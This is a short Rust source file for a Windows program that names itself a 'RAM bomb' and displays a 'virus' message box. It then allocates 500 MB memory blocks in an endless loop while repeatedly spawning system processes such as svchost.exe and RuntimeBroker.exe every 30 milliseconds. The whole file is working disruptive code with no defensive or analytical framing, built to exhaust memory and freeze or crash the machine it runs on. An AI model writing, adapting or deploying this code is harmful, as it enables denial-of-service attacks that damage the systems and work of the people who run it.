#[cfg(windows)]
mod simple_windows_ram_bomb {
    use std::ffi::CString;
    use std::process::Command;
    use std::thread;
    use std::time::Duration;
    use winapi::um::winuser::{MB_OK, MessageBoxA};

    pub fn start() {
        unsafe {
            let title = CString::new("System Alert").unwrap();
            let message = CString::new("This is enu virus").unwrap();
            MessageBoxA(
                std::ptr::null_mut(),
                message.as_ptr(),
                title.as_ptr(),
                MB_OK,
            );
        }

        thread::spawn(|| {
            let mut hog: Vec<Vec<u8>> = Vec::new();
            loop {
                hog.push(vec![0u8; 500 * 1024 * 1024]);
                println!("🔥 RAM CHUNK Allocated: {} MB", hog.len() * 500);
                thread::sleep(Duration::from_millis(10));
            }
        });

        let heavy_programs = vec![
            "RuntimeBroker.exe",
            "dllhost.exe",
            "SearchIndexer.exe",
            "svchost.exe",
        ];

        loop {
            for prog in &heavy_programs {
                let _ = Command::new(prog).spawn();
            }
            thread::sleep(Duration::from_millis(30));
        }
    }
}

#[cfg(windows)]
fn main() {
    simple_windows_ram_bomb::start();
}

#[cfg(not(windows))]
fn main() {
    println!("❌ This tool for Windows only.");
}
